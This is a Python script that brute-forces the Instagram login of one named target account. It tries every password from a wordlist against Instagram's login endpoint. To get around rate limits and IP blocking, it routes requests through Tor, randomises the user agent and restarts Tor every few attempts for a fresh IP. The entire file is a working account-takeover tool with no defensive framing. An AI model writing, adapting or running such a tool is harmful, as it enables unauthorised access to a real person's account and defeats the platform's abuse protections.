import requests
from fake_useragent import UserAgent
from datetime import datetime
import subprocess
import time
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_current_ip():
    """
    Get the current IP address using an external service.
    """
    try:
        response = requests.get('http://httpbin.org/ip')
        response.raise_for_status()
        ip_info = response.json()
        return ip_info['origin']
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to get current IP: {e}")
        return None

def login_instagram(username, password):
    """
    Attempt to login to Instagram with the provided username and password.
    """
    timestamp = int(datetime.now().timestamp())
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    user_agent = UserAgent().random

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://localhost:9050',
        'https': 'socks5h://localhost:9050'
    }
    session.headers.update({
        "User-Agent": user_agent,
        "Referer": "https://www.instagram.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.instagram.com"
    })

    try:
        response = session.get('https://www.instagram.com/accounts/login/')
        response.raise_for_status()
        csrf_token = response.cookies['csrftoken']
        session.headers.update({"X-CSRFToken": csrf_token})

        response = session.post(login_url, data=payload)
        response.raise_for_status()
        
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None
    except requests.exceptions.JSONDecodeError:
        logging.error(f"Failed to decode JSON. Response text: {response.text}")
        return None

def load_wordlist(filepath):
    """
    Load passwords from a wordlist file.
    """
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        logging.error(f"Wordlist file not found: {filepath}")
        return []

def renew_tor_ip():
    """
    Renew the Tor IP address by restarting the Tor service.
    """
    try:
        logging.info("Restarting Tor service...")
        subprocess.run(["sudo", "service", "tor", "restart"], check=True)
        logging.info("Tor service restarted successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to restart Tor service: {e}")

    # Wait and verify new IP address
    old_ip = get_current_ip()
    new_ip = old_ip
    retry_count = 0

    while new_ip == old_ip and retry_count < 5:
        time.sleep(10)  # Wait for the IP change to take effect
        new_ip = get_current_ip()
        retry_count += 1
        logging.info(f"Attempt {retry_count}: New IP address: {new_ip}")

    if new_ip == old_ip:
        logging.warning("IP address did not change after multiple attempts.")
    else:
        logging.info(f"IP address successfully changed to: {new_ip}")

def main():
    username = 'asilxon.o2.24'
    wordlist_path = 'wordlist.txt'
    passwords = load_wordlist(wordlist_path)
    
    if not passwords:
        logging.error("No passwords loaded, exiting.")
        return

    # Log initial IP
    current_ip = get_current_ip()
    if current_ip:
        logging.info(f"Initial IP address: {current_ip}")

    attempt_count = 0

    for password in passwords:
        if attempt_count % 3 == 0:
            renew_tor_ip()
            logging.info("Waiting for Tor IP change to take effect...")
            time.sleep(10)  # Wait for the IP change to take effect

            # Log new IP after change
            new_ip = get_current_ip()
            if new_ip:
                logging.info(f"New IP address after change: {new_ip}")
                if new_ip == current_ip:
                    logging.warning("IP address did not change, retrying IP renewal...")
                    renew_tor_ip()
                    time.sleep(10)  # Wait for the IP change to take effect again
                    new_ip = get_current_ip()
                    logging.info(f"New IP address after second attempt: {new_ip}")
            current_ip = new_ip

        result = login_instagram(username, password)
        if result:
            logging.info(f'Trying password: {password} - Result: {result}')
            
            attempt_count += 1

            if result.get('authenticated'):
                logging.info(f'Success! Password found: {password}')
                break
            elif 'message' in result and 'Please wait a few minutes' in result['message']:
                logging.warning('Rate limit reached, waiting...')
                time.sleep(60)  # Adjust sleep time according to the rate limit response
        else:
            logging.warning(f"Failed to process password: {password}")

if __name__ == '__main__':
    main()
